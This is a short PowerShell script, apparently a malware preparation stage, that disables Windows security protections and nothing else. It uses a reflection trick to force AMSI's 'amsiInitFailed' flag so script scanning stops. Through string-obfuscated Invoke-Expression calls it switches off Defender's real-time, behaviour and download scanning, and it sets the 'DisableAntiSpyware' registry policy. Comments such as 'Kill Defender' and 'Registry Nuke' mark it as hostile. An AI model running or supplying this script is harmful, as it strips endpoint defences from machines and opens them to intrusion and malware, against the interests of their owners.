$s = [Type];
$g = $s::GetType("System.Management.Automation.AmsiUtils");
$f = $g.GetField('amsiInitFailed', 'NonPublic,Static');
$f.SetValue($null, $true);

# Kill Defender Services & Preferences
$p = "Set-MpPreference";
Invoke-Expression "$p -DisableRealtimeMonitoring `$true";
Invoke-Expression "$p -DisableBehaviorMonitoring `$true";
Invoke-Expression "$p -DisableIOAVProtection `$true";

# Registry Nuke
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f;
